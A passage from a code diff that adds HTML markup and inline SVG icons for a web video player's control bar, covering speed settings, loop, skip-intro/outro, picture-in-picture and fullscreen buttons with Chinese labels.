+            <button class="yzmplayer-icon yzmplayer-comment-icon" data-balloon="发送弹幕" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" version="1.1" viewBox="0 0 68 65"><path class="yzmplayer-fill" style="fill:#ffffff" d="M45.7,31.48a3,3,0,0,1,2,.52,3.65,3.65,0,0,1,.39,2.19V40.1c0,1.29-.77,2-2.32,2.06H42.48a.34.34,0,0,0-.39.39L42,45.64a.34.34,0,0,0,.39.38h3c1.89-.17,2.74.69,2.57,2.58V54a10.88,10.88,0,0,1-.64,4.12c-.69,1.8-3,2.4-7,1.8a1.81,1.81,0,0,1-1.67-1.8c.17-1.12.77-1.63,1.8-1.55q4.5.78,4.12-1.67V49.75a.34.34,0,0,0-.39-.38H40.81q-2.72.39-2.32-3l.26-5.66c0-1.46.81-2.15,2.44-2.06h3.09a.34.34,0,0,0,.39-.39v-3a.34.34,0,0,0-.39-.38H40a1.71,1.71,0,0,1-1.67-1.8,1.83,1.83,0,0,1,1.8-1.68Zm14,3.48,1.8-3.61a1.7,1.7,0,0,1,2.32-.9,1.59,1.59,0,0,1,.9,2.19c-.34.77-.73,1.55-1.16,2.32h.9c1.63,0,2.45.9,2.45,2.7v9.78c.17,1.71-.82,2.53-3,2.44H59.72v2.19h7a1.59,1.59,0,0,1,1.54,1.67,1.46,1.46,0,0,1-1.41,1.68H59.72v4.37c-.09.86-.64,1.33-1.67,1.42-1-.09-1.59-.56-1.67-1.42V55.42H49.94a1.68,1.68,0,0,1,0-3.35h6.44V49.88H52.13c-2.15.18-3.13-.77-3-2.83V37.66c-.09-1.89.73-2.79,2.44-2.7h1a11.88,11.88,0,0,0-1-2.32,1.54,1.54,0,0,1,.78-2.32,1.74,1.74,0,0,1,2.44.91c.52,1,1.07,2.27,1.67,3.73Zm-7.08,6.17h3.74V37.92H53c-.26,0-.39.12-.39.38Zm3.74,5.79V43.71H52.64v2.83c.09.25.22.38.39.38Zm3.34-5.79h3.73V38.3a.33.33,0,0,0-.38-.38H59.72Zm0,5.79h3.35a.78.78,0,0,0,.38-.38V43.71H59.72Z"></path><path d="M53.64,6.83c-6.22-.13-12.45,0-18.68,0v0c-6.56,0-13.12-.15-19.67,0C7.84,7.09,2.15,12.55,2,19.89Q1.63,34.13,2,48.38A13.16,13.16,0,0,0,14,61.09c4.24.33,8.51.14,12.77.16,1.56,0,3.15-.17,3-2.26S28,57,26.54,57c-3.44,0-6.89.11-10.32,0-6-.27-9.88-4-10-9.92q-.32-13,0-26c.13-5.74,3.9-9.73,9.56-9.83,12.78-.23,25.57-.21,38.35,0,5.69.09,9.35,4,9.76,9.69.14,2,0,3.93.09,5.89a2,2,0,0,0,2.12,2.16,1.85,1.85,0,0,0,2-1.75C69.32,17.26,66.49,7.08,53.64,6.83Z" style="fill:#ffffff"></path><path d="M42.38,17.77H21.8c-1.43,0-2.73.39-2.91,2-.22,2,1.31,2.49,2.86,2.51q10.29.07,20.58,0c1.54,0,3.09-.48,2.91-2.47C45.09,18.17,43.8,17.77,42.38,17.77Z" style="fill:#ffffff"></path><path d="M33.1,29.59c-1.47.11-2.58.81-2.41,2.4.2,1.9,1.8,2.14,3.29,2s2.53-.69,2.45-2.54C36,29.79,34.66,29.47,33.1,29.59Z" style="fill:#ffffff"></path><path d="M27.29,31.88a2.5,2.5,0,0,0-2.49-2.49H15.72a2.49,2.49,0,1,0,0,5H24.8A2.49,2.49,0,0,0,27.29,31.88Z" style="fill:#ffffff"></path><path d="M18.11,46.12h9.08a2.49,2.49,0,1,0,0-5H18.11a2.49,2.49,0,1,0,0,5Z" style="fill:#ffffff" id="yzmplayer-comment"></path></svg></button>
+        </div>
+        
+        <div class="yzmplayer-setting"><button class="yzmplayer-icon yzmplayer-setting-speeds" data-balloon-pos="up"><span class="yzmplayer-label title">倍速</span><div class="yzmplayer-setting-speed-panel speed-stting"><div class="yzmplayer-setting-speed-item" data-speed="0.5"><span class="yzmplayer-label">0.5x</span></div><div class="yzmplayer-setting-speed-item" data-speed="0.75"><span class="yzmplayer-label">0.75x</span></div><div class="yzmplayer-setting-speed-item" data-speed="1"><span class="yzmplayer-label">正常</span></div><div class="yzmplayer-setting-speed-item" data-speed="1.25"><span class="yzmplayer-label">1.25x</span></div><div class="yzmplayer-setting-speed-item" data-speed="1.5"><span class="yzmplayer-label">1.5x</span></div><div class="yzmplayer-setting-speed-item" data-speed="2"><span class="yzmplayer-label">2.0x</span></div></div></button><!--<button class="yzmplayer-icon yzmplayer-list-icon" data-balloon="弹幕列表" data-balloon-pos="up"><span class="yzmplayer-icon-content"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" version="1.1" viewBox="0 0 32 32"><path class="yzmplayer-fill" style="fill:#ffffff" d="M26.667 5.333h-21.333c-0 0-0.001 0-0.001 0-1.472 0-2.666 1.194-2.666 2.666 0 0 0 0.001 0 0.001v-0 16c0 0 0 0.001 0 0.001 0 1.472 1.194 2.666 2.666 2.666 0 0 0.001 0 0.001 0h21.333c0 0 0.001 0 0.001 0 1.472 0 2.666-1.194 2.666-2.666 0-0 0-0.001 0-0.001v0-16c0-0 0-0.001 0-0.001 0-1.472-1.194-2.666-2.666-2.666-0 0-0.001 0-0.001 0h0zM5.333 16h5.333v2.667h-5.333v-2.667zM18.667 24h-13.333v-2.667h13.333v2.667zM26.667 24h-5.333v-2.667h5.333v2.667zM26.667 18.667h-13.333v-2.667h13.333v2.667z" id="yzmplayer-full-in"></path></svg></span></button>-->
+        <span class="yzmplayer-setting-block">    <button class="yzmplayer-icon yzmplayer-setting-icon" id="lottie-setting" data-balloon="设置" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 88 88" width="88" height="88" preserveAspectRatio="xMidYMid meet" style="width: 100%; height: 100%; transform: translate3d(0px, 0px, 0px);"><defs><clippath id="__lottie_element_2"><rect width="88" height="88" x="0" y="0"></rect></clippath></defs><g clip-path="url(#__lottie_element_2)"><g transform="matrix(1,0,0,1,44,43.875)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M0,8.125 C-4.420000076293945,8.125 -8,4.545000076293945 -8,0.125 C-8,-4.295000076293945 -4.420000076293945,-7.875 0,-7.875 C4.420000076293945,-7.875 8,-4.295000076293945 8,0.125 C8,4.545000076293945 4.420000076293945,8.125 0,8.125z M0,16.125 C8.84000015258789,16.125 16,8.96500015258789 16,0.125 C16,-8.71500015258789 8.84000015258789,-15.875 0,-15.875 C-8.84000015258789,-15.875 -16,-8.71500015258789 -16,0.125 C-16,8.96500015258789 -8.84000015258789,16.125 0,16.125z M4.539999961853027,27.51099967956543 C3.059999942779541,27.750999450683594 1.5499999523162842,27.871000289916992 0,27.871000289916992 C-1.5499999523162842,27.871000289916992 -3.059999942779541,27.750999450683594 -4.539999961853027,27.51099967956543 C-4.539999961853027,27.51099967956543 -8.699999809265137,32.56100082397461 -8.699999809265137,32.56100082397461 C-9.9399995803833,34.07099914550781 -12.100000381469727,34.46099853515625 -13.789999961853027,33.48099899291992 C-13.789999961853027,33.48099899291992 -21.780000686645508,28.871000289916992 -21.780000686645508,28.871000289916992 C-23.469999313354492,27.891000747680664 -24.209999084472656,25.83099937438965 -23.520000457763672,24.000999450683594 C-23.520000457763672,24.000999450683594 -21.290000915527344,18.06100082397461 -21.290000915527344,18.06100082397461 C-23.3799991607666,15.621000289916992 -25.049999237060547,12.810999870300293 -26.209999084472656,9.76099967956543 C-26.209999084472656,9.76099967956543 -32.65999984741211,8.680999755859375 -32.65999984741211,8.680999755859375 C-34.59000015258789,8.361000061035156 -36,6.690999984741211 -36,4.741000175476074 C-36,4.741000175476074 -36,-4.488999843597412 -36,-4.488999843597412 C-36,-6.439000129699707 -34.59000015258789,-8.109000205993652 -32.65999984741211,-8.428999900817871 C-32.65999984741211,-8.428999900817871 -26.399999618530273,-9.479000091552734 -26.399999618530273,-9.479000091552734 C-25.309999465942383,-12.559000015258789 -23.690000534057617,-15.388999938964844 -21.65999984741211,-17.868999481201172 C-21.65999984741211,-17.868999481201172 -23.959999084472656,-23.999000549316406 -23.959999084472656,-23.999000549316406 C-24.639999389648438,-25.839000701904297 -23.899999618530273,-27.888999938964844 -22.209999084472656,-28.868999481201172 C-22.209999084472656,-28.868999481201172 -14.220000267028809,-33.479000091552734 -14.220000267028809,-33.479000091552734 C-12.529999732971191,-34.45899963378906 -10.380000114440918,-34.069000244140625 -9.130000114440918,-32.558998107910156 C-9.130000114440918,-32.558998107910156 -5.099999904632568,-27.659000396728516 -5.099999904632568,-27.659000396728516 C-3.450000047683716,-27.9689998626709 -1.7400000095367432,-28.128999710083008 0,-28.128999710083008 C1.7400000095367432,-28.128999710083008 3.450000047683716,-27.9689998626709 5.099999904632568,-27.659000396728516 C5.099999904632568,-27.659000396728516 9.130000114440918,-32.558998107910156 9.130000114440918,-32.558998107910156 C10.380000114440918,-34.069000244140625 12.529999732971191,-34.45899963378906 14.220000267028809,-33.479000091552734 C14.220000267028809,-33.479000091552734 22.209999084472656,-28.868999481201172 22.209999084472656,-28.868999481201172 C23.899999618530273,-27.888999938964844 24.639999389648438,-25.839000701904297 23.959999084472656,-23.999000549316406 C23.959999084472656,-23.999000549316406 21.65999984741211,-17.868999481201172 21.65999984741211,-17.868999481201172 C23.690000534057617,-15.388999938964844 25.309999465942383,-12.559000015258789 26.399999618530273,-9.479000091552734 C26.399999618530273,-9.479000091552734 32.65999984741211,-8.428999900817871 32.65999984741211,-8.428999900817871 C34.59000015258789,-8.109000205993652 36,-6.439000129699707 36,-4.488999843597412 C36,-4.488999843597412 36,4.741000175476074 36,4.741000175476074 C36,6.690999984741211 34.59000015258789,8.361000061035156 32.65999984741211,8.680999755859375 C32.65999984741211,8.680999755859375 26.209999084472656,9.76099967956543 26.209999084472656,9.76099967956543 C25.049999237060547,12.810999870300293 23.3799991607666,15.621000289916992 21.290000915527344,18.06100082397461 C21.290000915527344,18.06100082397461 23.520000457763672,24.000999450683594 23.520000457763672,24.000999450683594 C24.209999084472656,25.83099937438965 23.469999313354492,27.891000747680664 21.780000686645508,28.871000289916992 C21.780000686645508,28.871000289916992 13.789999961853027,33.48099899291992 13.789999961853027,33.48099899291992 C12.100000381469727,34.46099853515625 9.9399995803833,34.07099914550781 8.699999809265137,32.56100082397461 C8.699999809265137,32.56100082397461 4.539999961853027,27.51099967956543 4.539999961853027,27.51099967956543z"></path></g></g></g></svg></button>
+            <div class="yzmplayer-setting-box">
+                <div class="yzmplayer-setting-origin-panel">
+                    <div class="yzmplayer-setting-item yzmplayer-setting-speed">
+        <span class="yzmplayer-setting-itemBlock"></span>                <span class="yzmplayer-label">速度</span>
+                        <div class="yzmplayer-toggle"><svg xmlns="http://www.w3.org/2000/svg" version="1.1" viewBox="0 0 32 32"><path d="M22 16l-10.105-10.6-1.895 1.987 8.211 8.613-8.211 8.612 1.895 1.988 8.211-8.613z"></path></svg></div>
+                    </div>
+                    <div class="yzmplayer-setting-item yzmplayer-setting-loop">
+      <span class="yzmplayer-setting-itemBlock"></span>                   <span class="yzmplayer-label yzmplayer-label-paddingLeft">洗脑循环</span>
+                        <div class="yzmplayer-toggle">
+                            <input class="yzmplayer-toggle-setting-input" type="checkbox" name="yzmplayer-toggle">
+                            <label for="yzmplayer-toggle"></label>
+                        </div>
+                    </div><div class="yzmplayer-setting-item yzmplayer-setting-jlast"><span class="yzmplayer-label yzmplayer-label-paddingLeft"><span class="text">跳过片尾</span><input id="jumptime" placeholder="单位/秒"></span><div class="yzmplayer-toggle"><input class="yzmplayer-toggle-setting-input" type="checkbox" name="yzmplayer-toggle"><label for="yzmplayer-toggle"></label></div></div><div class="yzmplayer-setting-item yzmplayer-setting-jfrist"><span class="yzmplayer-label yzmplayer-label-paddingLeft"><span class="text">跳过片头</span><input id="fristtime" placeholder="单位/秒"></span><div class="yzmplayer-toggle"><input class="yzmplayer-toggle-setting-input" type="checkbox" name="yzmplayer-toggle"><label for="yzmplayer-toggle"></label></div></div>
+      <div class="yzmplayer-op-block"></div>       </div>
+                <div class="yzmplayer-setting-speed-panel">
+                    <div class="yzmplayer-setting-speed-item" data-speed="0.5">
+                        <span class="yzmplayer-label">0.5x</span>
+                    </div>
+                    <div class="yzmplayer-setting-speed-item" data-speed="0.75">
+                        <span class="yzmplayer-label">0.75x</span>
+                    </div>
+                    <div class="yzmplayer-setting-speed-item" data-speed="1">
+                        <span class="yzmplayer-label">正常</span>
+                    </div>
+                    <div class="yzmplayer-setting-speed-item" data-speed="1.25">
+                        <span class="yzmplayer-label">1.25x</span>
+                    </div>
+                    <div class="yzmplayer-setting-speed-item" data-speed="1.5">
+                        <span class="yzmplayer-label">1.5x</span>
+                    </div>
+                    <div class="yzmplayer-setting-speed-item" data-speed="2">
+                        <span class="yzmplayer-label">2.0x</span>
+                    </div>
+                </div>
+            </div>
+   </span>
+     </div>
+        <div class="yzmplayer-full">
+            <button id="pipButton" class="yzmplayer-icon yzmplayer-full-in-icon" data-balloon="画中画" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 88 88" width="88" height="88" preserveAspectRatio="xMidYMid meet" style="width: 100%; height: 100%; transform: translate3d(0px, 0px, 0px);"><defs><clippath id="__lottie_element_7"><rect width="88" height="88" x="0" y="0"></rect></clippath></defs><g clip-path="url(#__lottie_element_7)"><g transform="matrix(1,0,0,1,41,41)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M26,-28 C30.420000076293945,-28 34,-24.420000076293945 34,-20 C34,-20 34,4 34,4 C34,4 26,4 26,4 C26,4 26,-16.799999237060547 26,-16.799999237060547 C26,-18.56999969482422 24.56999969482422,-20 22.799999237060547,-20 C22.799999237060547,-20 -22.799999237060547,-20 -22.799999237060547,-20 C-24.510000228881836,-20 -25.899999618530273,-18.65999984741211 -25.989999771118164,-16.979999542236328 C-25.989999771118164,-16.979999542236328 -26,-16.799999237060547 -26,-16.799999237060547 C-26,-16.799999237060547 -26,16.799999237060547 -26,16.799999237060547 C-26,18.510000228881836 -24.65999984741211,19.899999618530273 -22.979999542236328,19.989999771118164 C-22.979999542236328,19.989999771118164 -22.799999237060547,20 -22.799999237060547,20 C-22.799999237060547,20 2,20 2,20 C2,20 2,28 2,28 C2,28 -26,28 -26,28 C-30.420000076293945,28 -34,24.420000076293945 -34,20 C-34,20 -34,-20 -34,-20 C-34,-24.420000076293945 -30.420000076293945,-28 -26,-28 C-26,-28 26,-28 26,-28z"></path></g></g><g transform="matrix(1,0,0,1,67,65)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M16,-8 C16,-8 16,8 16,8 C16,10.208999633789062 14.208999633789062,12 12,12 C12,12 -12,12 -12,12 C-14.208999633789062,12 -16,10.208999633789062 -16,8 C-16,8 -16,-8 -16,-8 C-16,-10.208999633789062 -14.208999633789062,-12 -12,-12 C-12,-12 12,-12 12,-12 C14.208999633789062,-12 16,-10.208999633789062 16,-8z"></path></g></g><g style="display: none;"><g><path></path></g></g></g></svg></button>
+            <button class="yzmplayer-icon yzmplayer-full-icon" id="lottie-full" data-balloon="全屏" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 88 88" width="88" height="88" preserveAspectRatio="xMidYMid meet" style="width: 100%; height: 100%; transform: translate3d(0px, 0px, 0px);"><defs><clippath id="__lottie_element_18"><rect width="88" height="88" x="0" y="0"></rect></clippath></defs><g clip-path="url(#__lottie_element_18)"><g transform="matrix(1,0,0,1,44,74.22000122070312)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M19.219999313354492,0.2199999988079071 C7.480000019073486,7.630000114440918 -7.480000019073486,7.630000114440918 -19.219999313354492,0.2199999988079071 C-19.219999313354492,0.2199999988079071 -16.219999313354492,-5.78000020980835 -16.219999313354492,-5.78000020980835 C-6.389999866485596,0.75 6.409999847412109,0.75 16.239999771118164,-5.78000020980835 C16.239999771118164,-5.78000020980835 19.219999313354492,0.2199999988079071 19.219999313354492,0.2199999988079071z"></path></g></g><g transform="matrix(1,0,0,1,68.58000183105469,27.895000457763672)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M11.420000076293945,16.104999542236328 C11.420000076293945,16.104999542236328 4.78000020980835,16.104999542236328 4.78000020980835,16.104999542236328 C4.78000020980835,16.104999542236328 4.78000020980835,14.635000228881836 4.78000020980835,14.635000228881836 C4.25,4.054999828338623 -1.940000057220459,-5.425000190734863 -11.420000076293945,-10.164999961853027 C-11.420000076293945,-10.164999961853027 -8.479999542236328,-16.104999542236328 -8.479999542236328,-16.104999542236328 C3.7200000286102295,-10.005000114440918 11.420000076293945,2.4649999141693115 11.420000076293945,16.104999542236328 C11.420000076293945,16.104999542236328 11.420000076293945,16.104999542236328 11.420000076293945,16.104999542236328z"></path></g></g><g transform="matrix(1,0,0,1,19.450000762939453,27.895000457763672)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M-4.809999942779541,16.104999542236328 C-4.809999942779541,16.104999542236328 -11.449999809265137,16.104999542236328 -11.449999809265137,16.104999542236328 C-11.449999809265137,2.4649999141693115 -3.75,-10.005000114440918 8.449999809265137,-16.104999542236328 C8.449999809265137,-16.104999542236328 11.449999809265137,-10.164999961853027 11.449999809265137,-10.164999961853027 C1.4900000095367432,-5.204999923706055 -4.809999942779541,4.974999904632568 -4.809999942779541,16.104999542236328 C-4.809999942779541,16.104999542236328 -4.809999942779541,16.104999542236328 -4.809999942779541,16.104999542236328z"></path></g></g><g transform="matrix(1,0,0,1,44.0099983215332,65.96499633789062)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M-0.009999999776482582,5.34499979019165 C-5.46999979019165,5.355000019073486 -10.800000190734863,3.7149999141693115 -15.319999694824219,0.6549999713897705 C-15.319999694824219,0.6549999713897705 -12.319999694824219,-5.34499979019165 -12.319999694824219,-5.34499979019165 C-5,0.08500000089406967 5,0.08500000089406967 12.319999694824219,-5.34499979019165 C12.319999694824219,-5.34499979019165 15.319999694824219,0.6549999713897705 15.319999694824219,0.6549999713897705 C10.800000190734863,3.7249999046325684 5.460000038146973,5.355000019073486 -0.009999999776482582,5.34499979019165z"></path></g></g><g transform="matrix(1,0,0,1,62.275001525878906,31.780000686645508)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M9.015000343322754,10.850000381469727 C9.015000343322754,10.850000381469727 9.015000343322754,12.220000267028809 9.015000343322754,12.220000267028809 C9.015000343322754,12.220000267028809 2.434999942779541,12.220000267028809 2.434999942779541,12.220000267028809 C2.434999942779541,12.220000267028809 2.434999942779541,11.220000267028809 2.434999942779541,11.220000267028809 C2.075000047683716,3.740000009536743 -2.305000066757202,-2.9700000286102295 -9.015000343322754,-6.309999942779541 C-9.015000343322754,-6.309999942779541 -6.014999866485596,-12.220000267028809 -6.014999866485596,-12.220000267028809 C-6.014999866485596,-12.220000267028809 -6.014999866485596,-12.220000267028809 -6.014999866485596,-12.220000267028809 C2.7850000858306885,-7.800000190734863 8.524999618530273,1.0099999904632568 9.015000343322754,10.850000381469727 C9.015000343322754,10.850000381469727 9.015000343322754,10.850000381469727 9.015000343322754,10.850000381469727z"></path></g></g><g transform="matrix(1,0,0,1,25.729999542236328,31.780000686645508)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M-2.440000057220459,12.220000267028809 C-2.440000057220459,12.220000267028809 -9.050000190734863,12.220000267028809 -9.050000190734863,12.220000267028809 C-9.050000190734863,1.8700000047683716 -3.2100000381469727,-7.590000152587891 6.050000190734863,-12.220000267028809 C6.050000190734863,-12.220000267028809 9.050000190734863,-6.309999942779541 9.050000190734863,-6.309999942779541 C2.0199999809265137,-2.809999942779541 -2.430000066757202,4.360000133514404 -2.440000057220459,12.220000267028809 C-2.440000057220459,12.220000267028809 -2.440000057220459,12.220000267028809 -2.440000057220459,12.220000267028809z"></path></g></g><g transform="matrix(1,0,0,1,44,57.654998779296875)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M0,4.974999904632568 C-4.110000133514404,4.994999885559082 -8.119999885559082,3.6449999809265137 -11.380000114440918,1.1349999904632568 C-11.380000114440918,1.1349999904632568 -8.319999694824219,-4.974999904632568 -8.319999694824219,-4.974999904632568 C-3.6700000762939453,-0.5049999952316284 3.6700000762939453,-0.5049999952316284 8.319999694824219,-4.974999904632568 C8.319999694824219,-4.974999904632568 11.380000114440918,1.1349999904632568 11.380000114440918,1.1349999904632568 C8.109999656677246,3.634999990463257 4.110000133514404,4.985000133514404 0,4.974999904632568 C0,4.974999904632568 0,4.974999904632568 0,4.974999904632568z"></path></g></g><g transform="matrix(1,0,0,1,55.9900016784668,35.665000915527344)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M6.619999885559082,7.40500020980835 C6.619999885559082,7.40500020980835 6.619999885559082,8.335000038146973 6.619999885559082,8.335000038146973 C6.619999885559082,8.335000038146973 0.009999999776482582,8.335000038146973 0.009999999776482582,8.335000038146973 C0.009999999776482582,3.7850000858306885 -2.549999952316284,-0.375 -6.619999885559082,-2.4049999713897705 C-6.619999885559082,-2.4049999713897705 -3.619999885559082,-8.335000038146973 -3.619999885559082,-8.335000038146973 C2.380000114440918,-5.324999809265137 6.300000190734863,0.6949999928474426 6.619999885559082,7.40500020980835 C6.619999885559082,7.40500020980835 6.619999885559082,7.40500020980835 6.619999885559082,7.40500020980835z"></path></g></g><g transform="matrix(1,0,0,1,31.9950008392334,35.665000915527344)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M6.635000228881836,-2.4049999713897705 C2.565000057220459,-0.375 0.004999999888241291,3.7850000858306885 0.004999999888241291,8.335000038146973 C0.004999999888241291,8.335000038146973 -6.635000228881836,8.335000038146973 -6.635000228881836,8.335000038146973 C-6.635000228881836,1.274999976158142 -2.6449999809265137,-5.184999942779541 3.674999952316284,-8.335000038146973 C3.674999952316284,-8.335000038146973 6.635000228881836,-2.4049999713897705 6.635000228881836,-2.4049999713897705z"></path></g></g><g transform="matrix(1,0,0,1,44,66.322998046875)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M8.319000244140625,-13.677000045776367 C8.319000244140625,-13.677000045776367 19.2189998626709,8.123000144958496 19.2189998626709,8.123000144958496 C13.659000396728516,11.642999649047852 7.068999767303467,13.67300033569336 -0.0010000000474974513,13.67300033569336 C-7.071000099182129,13.67300033569336 -13.66100025177002,11.642999649047852 -19.22100067138672,8.123000144958496 C-19.22100067138672,8.123000144958496 -8.321000099182129,-13.677000045776367 -8.321000099182129,-13.677000045776367 C-6.160999774932861,-11.597000122070312 -3.2309999465942383,-10.32699966430664 -0.0010000000474974513,-10.32699966430664 C3.2290000915527344,-10.32699966430664 6.169000148773193,-11.597000122070312 8.319000244140625,-13.677000045776367z"></path></g></g><g transform="matrix(1,0,0,1,64.68399810791016,27.89699935913086)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M15.314000129699707,16.10700035095215 C15.314000129699707,16.10700035095215 -8.685999870300293,16.10700035095215 -8.685999870300293,16.10700035095215 C-8.685999870300293,11.406999588012695 -11.38599967956543,7.336999893188477 -15.315999984741211,5.367000102996826 C-15.315999984741211,5.367000102996826 -4.576000213623047,-16.10300064086914 -4.576000213623047,-16.10300064086914 C7.214000225067139,-10.192999839782715 15.314000129699707,2.006999969482422 15.314000129699707,16.10700035095215z"></path></g></g><g transform="matrix(1,0,0,1,23.31599998474121,27.89699935913086)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M4.584000110626221,-16.10300064086914 C4.584000110626221,-16.10300064086914 15.314000129699707,5.367000102996826 15.314000129699707,5.367000102996826 C11.383999824523926,7.336999893188477 8.684000015258789,11.406999588012695 8.684000015258789,16.10700035095215 C8.684000015258789,16.10700035095215 -15.315999984741211,16.10700035095215 -15.315999984741211,16.10700035095215 C-15.315999984741211,2.006999969482422 -7.216000080108643,-10.192999839782715 4.584000110626221,-16.10300064086914z"></path></g></g><g transform="matrix(1,0,0,1,44,44)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M0,-4 C2.140000104904175,-4 3.890000104904175,-2.319999933242798 4,-0.20000000298023224 C4,-0.20000000298023224 4,0 4,0 C4,0 4,0.20000000298023224 4,0.20000000298023224 C3.890000104904175,2.319999933242798 2.140000104904175,4 0,4 C-2.2100000381469727,4 -4,2.2100000381469727 -4,0 C-4,-2.2100000381469727 -2.2100000381469727,-4 0,-4z"></path></g></g></g></svg></button><button class="yzmplayer-icon yzmplayer-fulloff-icon" id="lottie-fullOff" data-balloon="退出全屏" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 88 88" width="88" height="88" preserveAspectRatio="xMidYMid meet" style="width: 100%; height: 100%; transform: translate3d(0px, 0px, 0px);"><defs><clippath id="__lottie_element_59"><rect width="88" height="88" x="0" y="0"></rect></clippath></defs><g clip-path="url(#__lottie_element_59)"><g transform="matrix(1,0,0,1,44,74.22000122070312)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M19.219999313354492,0.2199999988079071 C7.480000019073486,7.630000114440918 -7.480000019073486,7.630000114440918 -19.219999313354492,0.2199999988079071 C-19.219999313354492,0.2199999988079071 -16.219999313354492,-5.78000020980835 -16.219999313354492,-5.78000020980835 C-6.389999866485596,0.75 6.409999847412109,0.75 16.239999771118164,-5.78000020980835 C16.239999771118164,-5.78000020980835 19.219999313354492,0.2199999988079071 19.219999313354492,0.2199999988079071z"></path></g></g><g transform="matrix(1,0,0,1,68.58000183105469,27.895000457763672)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M11.420000076293945,16.104999542236328 C11.420000076293945,16.104999542236328 4.78000020980835,16.104999542236328 4.78000020980835,16.104999542236328 C4.78000020980835,16.104999542236328 4.78000020980835,14.635000228881836 4.78000020980835,14.635000228881836 C4.25,4.054999828338623 -1.940000057220459,-5.425000190734863 -11.420000076293945,-10.164999961853027 C-11.420000076293945,-10.164999961853027 -8.479999542236328,-16.104999542236328 -8.479999542236328,-16.104999542236328 C3.7200000286102295,-10.005000114440918 11.420000076293945,2.4649999141693115 11.420000076293945,16.104999542236328 C11.420000076293945,16.104999542236328 11.420000076293945,16.104999542236328 11.420000076293945,16.104999542236328z"></path></g></g><g transform="matrix(1,0,0,1,19.450000762939453,27.895000457763672)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M-4.809999942779541,16.104999542236328 C-4.809999942779541,16.104999542236328 -11.449999809265137,16.104999542236328 -11.449999809265137,16.104999542236328 C-11.449999809265137,2.4649999141693115 -3.75,-10.005000114440918 8.449999809265137,-16.104999542236328 C8.449999809265137,-16.104999542236328 11.449999809265137,-10.164999961853027 11.449999809265137,-10.164999961853027 C1.4900000095367432,-5.204999923706055 -4.809999942779541,4.974999904632568 -4.809999942779541,16.104999542236328 C-4.809999942779541,16.104999542236328 -4.809999942779541,16.104999542236328 -4.809999942779541,16.104999542236328z"></path></g></g><g transform="matrix(1,0,0,1,44.0099983215332,65.96499633789062)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M-0.009999999776482582,5.34499979019165 C-5.46999979019165,5.355000019073486 -10.800000190734863,3.7149999141693115 -15.319999694824219,0.6549999713897705 C-15.319999694824219,0.6549999713897705 -12.319999694824219,-5.34499979019165 -12.319999694824219,-5.34499979019165 C-5,0.08500000089406967 5,0.08500000089406967 12.319999694824219,-5.34499979019165 C12.319999694824219,-5.34499979019165 15.319999694824219,0.6549999713897705 15.319999694824219,0.6549999713897705 C10.800000190734863,3.7249999046325684 5.460000038146973,5.355000019073486 -0.009999999776482582,5.34499979019165z"></path></g></g><g transform="matrix(1,0,0,1,62.275001525878906,31.780000686645508)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M9.015000343322754,10.850000381469727 C9.015000343322754,10.850000381469727 9.015000343322754,12.220000267028809 9.015000343322754,12.220000267028809 C9.015000343322754,12.220000267028809 2.434999942779541,12.220000267028809 2.434999942779541,12.220000267028809 C2.434999942779541,12.220000267028809 2.434999942779541,11.220000267028809 2.434999942779541,11.220000267028809 C2.075000047683716,3.740000009536743 -2.305000066757202,-2.9700000286102295 